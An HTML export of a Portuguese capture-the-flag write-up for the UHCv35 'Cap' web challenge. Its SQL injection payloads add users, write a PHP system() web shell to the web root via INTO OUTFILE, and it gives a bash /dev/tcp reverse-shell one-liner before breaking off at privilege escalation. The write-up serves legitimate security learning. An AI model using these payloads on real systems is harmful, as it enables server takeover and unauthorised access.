@@ -1,0 +1,637 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>UHCV35 - (Classificatória - Web) Write-Up - Cap</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="1a60c1ae-95e3-4509-a19a-b06c41efe2e9" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🧢</span></div><h1 class="page-title">UHCV35 - (Classificatória - Web) Write-Up - Cap</h1><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>vulns and exploitations</th><td><span class="selected-value select-value-color-green">api</span><span class="selected-value select-value-color-yellow">capabilities</span><span class="selected-value select-value-color-default">code review</span><span class="selected-value select-value-color-brown">maria db</span><span class="selected-value select-value-color-orange">sql</span><span class="selected-value select-value-color-red">sqli</span></td></tr></tbody></table></header><div class="page-body"><h3 id="1bd96c13-d3a1-4e1e-84d6-28dcc60afa79" class="">Escrito por: Vinicius (big0us)<mark class="highlight-yellow"> </mark><mark class="highlight-teal"> </mark></h3><p id="6a912ff5-f384-4207-8f3b-6385ef211555" class="">Tenho 16 anos, jogo CTF faz alguns meses e também participo do UHC aos finais de semanas. Essa máquina foi feita pelo Kadu para a classificatória do UHCv35.</p><ul id="d741bb25-9c3f-448f-8c00-df60cbcca46f" class="toggle"><li><details open=""><summary>Meus perfis</summary><figure id="11719dfe-3819-44a0-a9be-bbfc16c4d63a"><a href="https://github.com/viniciuspereiras/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">viniciuspereiras - Overview</div><div class="bookmark-description">as vezes &quot;big0us&quot; for fun :). viniciuspereiras has one repository available. Follow their code on GitHub.</div></div><div class="bookmark-href"><img src="https://github.com/favicon.ico" class="icon bookmark-icon"/>https://github.com/viniciuspereiras/</div></div><img src="https://avatars2.githubusercontent.com/u/69733777?s=400&amp;u=0132e5e4a44d7bd0eb01176e2187618a1f7aa887&amp;v=4" class="bookmark-image"/></a></figure><figure id="78d2c69f-dcff-4707-83c7-f01f970669e4"><a href="https://tryhackme.com/p/big0us" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">TryHackMe | big0us</div><div class="bookmark-description">TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!</div></div><div class="bookmark-href"><img src="https://assets.tryhackme.com/img/favicon.png" class="icon bookmark-icon"/>https://tryhackme.com/p/big0us</div></div><img src="https://tryhackme-images.s3.amazonaws.com/user-avatars/acbda194c8e42a3049fb6ffcbf6dc290.png" class="bookmark-image"/></a></figure><figure id="1eca9cdf-f9cf-4808-9206-8641ccbf564f"><a href="https://www.hackthebox.eu/home/users/profile/406363" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Hack The Box :: Penetration Testing Labs</div><div class="bookmark-description">Login to the Hack The Box platform and take your pen-testing and cyber security skills to the next level!</div></div><div class="bookmark-href"><img src="https://www.hackthebox.eu/images/favicon.png" class="icon bookmark-icon"/>https://www.hackthebox.eu/home/users/profile/406363</div></div><img src="https://www.hackthebox.eu/images/favicon.png" class="bookmark-image"/></a></figure></details></li></ul><h1 id="05ead0e8-949c-4967-b11e-bb362c410725" class="">Recon </h1><p id="f8c79897-0fb5-49c8-a15b-1233a522f886" class="">Iniciando o desafio e pegando a url podemos observar que ele tem uma página um tanto quanto estranha, parece ser uma API, já que retorna um objeto JSON:</p><figure id="72316d6c-d95b-4196-8aee-3743b8eb819e" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled.png"><img style="width:370px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled.png"/></a></figure><p id="e9382850-327b-498d-afdd-33e25c53ff48" class="">Vamos então partir direto para o fuzzing, vou rodar a wordlist common.txt e a quiclhits.txt:</p><p id="d8f92caf-566d-4b88-a58a-bdb5175a8e93" class=""><mark class="highlight-red">common.txt:</mark></p><figure id="f32c0f2a-6018-40d9-91fc-770480452dfb" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%201.png"><img style="width:576px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%201.png"/></a></figure><p id="9b038a51-a06a-4f76-8834-e53b2b425bff" class="block-color-red">quickhits.txt:</p><figure id="06311f74-b98f-4375-987d-e8ca73c40cb9" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%202.png"><img style="width:576px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%202.png"/></a></figure><p id="31adfd74-c71b-4fd1-b675-705cb9c37ce3" class="">Achamos um arquivo de backup! Vou baixar e abrir no visual studio code.</p><figure id="ef066433-26fe-4ef8-bc59-92f56fd31742" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%203.png"><img style="width:1366px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%203.png"/></a></figure><p id="0a248de5-dfb6-460b-bc93-7872d4b2ad1a" class="">Hora de debugar!</p><p id="ed0dde3f-42e2-49fa-9318-449722def640" class="">Esse código basicamente é uma tentativa de um tipo de API para interagir com algum tipo de banco de dados, ele pega informações de databases e é capaz de inserir informações também, podemos perceber que ele usa um micro framework chamado Slim. (<a href="https://www.slimframework.com/docs/v2/">https://www.slimframework.com/docs/v2/</a>)</p><p id="4334a61b-1c80-4177-a12e-611bf38c07aa" class="">Essa parte envolve muito code review, que é inclusive o nome do challenge da primeira flag. Fui testando tudo e lendo os erros (debug mode estava ativo).</p><p id="52ebcfab-5084-4106-a52f-350e7d93f963" class="">Dando uma lida e debugando um pouco podemos perceber que existe uma rota dessa api que faz uma consulta no banco de dados na tabela usuarios.</p><p id="480697b3-3045-4e9b-9fa7-6fdb4bf8e505" class="">Rota:</p><pre id="1693f259-5e5c-4057-a03a-46e16186930a" class="code"><code>https://cap.uhclabs.com/_ul/uploads/0</code></pre><p id="b95fdfc6-b56c-4b9b-a664-6f251f155a09" class="">Código:</p><figure id="818c5b38-0588-4c91-b245-868652b78413" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%204.png"><img style="width:828px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%204.png"/></a></figure><p id="dab87794-64f2-41e7-8098-a67f59453a7a" class="">Basicamente aonde está escrito :controller é aonde vamos inserir o nome do arquivo que contém a classe que vamos usar, no caso vamos ussar o usuarios.class.php, e :parametrer sera o $data que será passado na query da consulta como podemos ver aqui:</p><figure id="c2684d44-fe81-4183-812d-0ec603ed9248" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%205.png"><img style="width:799px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%205.png"/></a></figure><p id="5d28da29-c367-4d84-846d-1a420707e602" class="">Agora vamos rodar:</p><p id="63cc3bfa-5948-4089-bcef-601cb8fa5393" class="">Testei alguns ids e no 2 temos a primeira flag hehe:</p><figure id="bdb44cc4-6c97-4139-bf54-a9e689a9193f" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%206.png"><img style="width:420px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%206.png"/></a></figure><p id="c6ff10b3-b205-4c51-b8ca-8de51e1a065f" class="">Certo, como podemos perceber no código, nossos parâmetros não passam por nenhum tipo de tratamento, obviamente o site está vulnerável a Sql injection.</p><figure id="964d5a9c-bedc-4e47-b415-c7ff4b11949a" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%207.png"><img style="width:1213px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%207.png"/></a></figure><p id="90b8a1b0-f0b8-4794-bfb8-a21b70658fcc" class="">Então vamos ver o que podemos fazer aqui.</p><h1 id="4abaca6d-b525-4fac-9c77-cf747b332fa6" class="">Exploitation - Sqlinjection</h1><p id="965b25e4-52a3-4f7f-afe2-59ac0812b6f6" class="">Podemos observar que o banco de dados usado é o MariaDB.</p><p id="ab5f544e-a35a-4065-bb14-7a69e0856ab6" class="">Vamos começar tentando mandar querys para a aplicação.</p><p id="5e3a0f5a-851a-4fb0-8521-78cd00462902" class="">Para demonstrar o que está acontecendo irei mostrar as payloads e como a query está sendo executada no site.</p><p id="053af6dd-55e9-4c0a-8597-d1adb3b35354" class="">
+</p><ul id="7cb4c7f0-cb9b-40b0-8ef5-cdd150108589" class="bulleted-list"><li>A primeira coisa que irei fazer vai ser tentar adicionar um usuário, ja que temos o código sabemos o nome da tabela...</li></ul><pre id="9a8d5798-646d-4501-9230-46faa1ad248b" class="code"><code>cap.uhclabs.com/_ul/usuarios/1;insert%20into%20usuarios%20(nome)%20values%20(&#x27;big0us&#x27;)</code></pre><p id="6269e410-b4bf-4219-9f76-46937689cacc" class="">Com um Url encode na nossa payload se enviarmos, a query ficará assim:</p><pre id="ce652e91-58d9-4e85-bf7d-9a80c3e15cb0" class="code"><code>SELECT * from usuarios where id=1; insert into usuarios (nome) values (&#x27;big0us&#x27;);</code></pre><p id="2dbe643b-8217-421f-9435-455e155eccbd" class="">Enviando mais algumas vezes podemos ver que nosso usuário já está no banco de dados com a seguinte rota:</p><pre id="f3f9862a-f794-4e18-afa4-bd209e18e8ad" class="code"><code>cap.uhclabs.com/_ul/usuarios/0</code></pre><p id="5f65ae51-bf9d-4f6f-b480-15a9f33b78d0" class="">
+</p><ul id="c7e5e5a5-5a6f-4c5a-aab9-eb51892a1c29" class="bulleted-list"><li>No MariaDB existe um comando que possibilita salvar o resultado da query em um arquivo...</li></ul><ul id="b32285d8-7abf-4e1c-909b-a5dc0c8ec262" class="bulleted-list"><li>Lendo o código fonte, podemos abrir arquivos que estiverem no /classes/ apenas enviando um request POST, com o nome do arquivo sem o .classes e sem o .php...</li></ul><figure id="d10d3eff-e6eb-478c-84b6-37df0d224bdb" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%208.png"><img style="width:737px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%208.png"/></a></figure><ul id="29dc18fc-ee8a-49b8-b03b-e31b020847f9" class="bulleted-list"><li>Se pudermos salvar arquivos de consultas de querys em qualquer diretório e podemos escrever e rodar arquivos no servidor, temos tudo para conseguir um RCE. Mas como?</li></ul><ul id="03a12ab8-1cda-4b68-8f64-d3e871ce849d" class="bulleted-list"><li>(Existem várias formas de fazer isso vou descrever como eu fiz)</li></ul><ul id="7c1bfad7-c47f-4aed-8a0f-35b18e1dd120" class="bulleted-list"><li>Já que posso criar um usuário, vou criar um usuário contendo um código php no nome, assim quando eu jogar isso para dentro de um arquivo, será executado... Então vamos as payloads:
+</li></ul><p id="12c49d9c-9b29-49be-83ea-39b840af82de" class="">URL:</p><pre id="89549ab1-89d7-4e26-87e9-157392edc504" class="code"><code>cap.uhclabs.com/_ul/usuarios/1;1%3Bselect%20into%20usuarios%20%28nome%29%20values%20%28%27%3C%3Fphp%20system%28%24%5FGET%5B0%5D%3F%3E%27%29%29</code></pre><p id="368fc8fc-38f0-4a67-8001-7fbc5bf77b3d" class="">Query:</p><pre id="12abc90f-d49d-447b-8b49-c78694c7c480" class="code"><code>select into usuarios (nome) values (&#x27;&lt;?php system($_GET[0]?&gt;&#x27;))</code></pre><p id="55439780-55b1-4e4c-92a8-b7f9cac90d2c" class="">
+</p><p id="7546d176-5f04-40f0-82d8-48095dd9fc96" class="">E agora com o usuário criado, vamos fazer uma consulta que retorne o nome do usuário, e salvar isso em um arquivo... (dei o nome de &quot;u&quot;)</p><p id="3bafc1c8-25b6-4cd7-b771-bec74096eda8" class="">URL:</p><pre id="66f98e9f-7566-4b3a-955a-63332cbfb538" class="code"><code>cap.uhclabs.com/_ul/usuarios/1%3Bselect%20%2A%20from%20usuarios%20into%20outfile%20%27%2Fvar%2Fwww%2Fhtml%2Fclasses%2Fu%2Eclass%2Ephp%27</code></pre><p id="c540b83b-8e04-48a1-accf-68c08219dbc1" class="">Query: </p><pre id="9a587062-871f-4243-90dc-c23557330eb1" class="code"><code>select * from usuarios into outfile &#x27;/var/www/html/classes/u.class.php&#x27;</code></pre><p id="ba459533-d489-4f1d-9008-f01605764560" class="">Agora que já montamos nosso arquivo malicioso vamos ao request:</p><figure id="8d2f7358-0d02-4510-8544-df13ea1cb3f7" class="image"><a href="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%209.png"><img style="width:1088px" src="UHCV35%20-%20(Classificato%CC%81ria%20-%20Web)%20Write-Up%20-%20Cap%2072316d6cd95b41968aee3743b8eb819e/Untitled%209.png"/></a></figure><p id="b76db82d-f0b5-4bf0-835e-b18292a72852" class="">Agora que temos RCE vamos pegar uma shell.</p><h1 id="033a0d23-b3ab-4632-92bd-802c7bfc261d" class="">Pós exploitation - Root Capability</h1><p id="b7e58ed7-ddd9-4442-a43f-20087b193d65" class="">Utilizei uma payload simples encodada em url encode:</p><pre id="46671680-ca7e-4d0b-b2ed-99a6b58fd6a4" class="code"><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/porta 0&gt;&amp;1&quot;</code></pre><p id="b2288331-2a4f-49e8-b7d2-b0e2dd15b851" class="">
